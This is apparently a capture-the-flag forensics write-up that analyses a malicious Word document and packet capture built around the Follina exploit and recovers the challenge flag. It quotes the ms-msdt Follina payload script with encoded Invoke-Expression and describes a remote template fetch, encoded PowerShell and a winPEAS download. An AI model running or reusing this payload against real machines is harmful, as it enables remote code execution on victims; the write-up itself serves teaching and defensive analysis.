...
After downloading the challenge [files](forensics_linas_invitation.zip), we can find a pcap and a docx.

I decided to take a look at the word document first. Since it's a docx, we can extract the bundle by opening the document as a zip archive.
```
.
├── [Content_Types].xml
├── docProps
...
In the word/_rels/document.xml.rels file we can find some External Dependencies, the base for the newer Follina attack vector.
```xml
...
That second last Relationship is the one that would trigger the download and execution of the html file:
```xml
...
That website `http://windowsliveupdater.com` is a redirector to Rick Roll. So that is fun! Nothing much to see here, let's move on to the pcap.
...
Using this url decoder, https://meyerweb.com/eric/tools/dencoder/, we can see what the page would look like.\
![urldecode.png](urldecode.png)
...
After going through `echo "<data>" | base64 -d` and sending the result to https://rot13.com/ multiple time, I decided to use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)ROT13(true,true,false,13)) to do both steps at once.
...
I wasn't really sure what I was doing that for, but I was hoping that maybe in that last one, there could have been a hard-coded username and the flag as the password? Something like that could have been the challenge but no. I finally saw the next section and knew that would be much more interesting:
```html
<script>
    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+''+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
</script>
...
That looks more like the continuation of the Follina exploit.
...
We can find part 1 of our flag `HTB{Zer0_DayZ_4Re_C0Ol_BuT_` and see that the attacker opened a command prompt.

Trying to find the next part of the flag, we can see that the next stream is very interesting. We can open it with "Follow TCP Stream":\
![follow4.png](follow4.png)
...
Among other things are some clear text passwords from the Notes.txt file, two encoded powershell command and a download of winPEAS.exe.
...
We can see that the second one has some l33t speak in it, which made it much more interesting. Using a bit of python, we can check what they are actually doing:
```python
>>> a = ['h','.exe','<#{0','!}','eas','A','t3=b33n_p','}p','3d','tc','#> .{1}winp']
>>> "".join([a[x] for x in [2,7,6,5,9,0,8,3,10,4,1]])
'<#{0}pt3=b33n_pAtch3d!}#> .{1}winpeas.exe'
```

Which resolves to the following with the second -f: `<#$pt3=b33n_pAtch3d!}#> .\winpeas.exe`

Ok, so that is part 3 of the flag... but I wanted part 2.
```
HTB{Zer0_DayZ_4Re_C0Ol_BuT_               b33n_pAtch3d!}
```

Looking around some more in the pcap, there is another interesting stream. In the stream 12, we can find the download of a few files, but most of them are send in chunks, throught HTTP 206 Partial Content. The last one is not, so we can try to start by looking at that one.\
![crxpcap.png](crxpcap.png)

Looking at the magic bytes (Cr24) or using `file`, we can identify the file as a chrome extension. We can use this [website](https://robwu.nl/crxviewer/) to explore the extension's files.\
![zxcvbn.png](zxcvbn.png)

We can search online about "zxcvbn data" and find out that this is an extension that is used by Google to check for weak passwords. My first thought was that we have the version of the extension, maybe we can find the official release and compare the content of the files. The second part may be inserted in one of the files. I tried to do a quick search first for anything with an underscore, with the assumption that that second part of the flag would have more than one word, and it would be easily recognizable as l33t speak. I had no luck with that search.
...
```
tshark -r capture.pcapng --export-objects http,objs
```

This gave us the following objects, where we can see 2132f61f, c78f9967 and f08b21db as our three extensions.\
![objs.png](objs.png)

f08b21db is the one we already looked at, since it wasn't sent in chunks.
...
```
Sooo, none of the crx would be the last part?
Weird to have included them then
```

I did not believe it would be there for no reason... but it did make me think about something else:
```
Why are the crx useless... wait... we have a word doc... why do we have that other full file then?
```
Maybe there was more to it than "being the first phase in the Follina exploit".
...
That  "Pt2" key now can't be ignored. The second part is base64 encoded, and resolves to `F0llina_h4s_`

The full flag becomes `HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_b33n_pAtch3d!}`.

P.S. Only once I actually finished writing my writeup for Lina's Invitation that I realized... it wasn't Lina's... it was Fol-Lina's Invitation. :)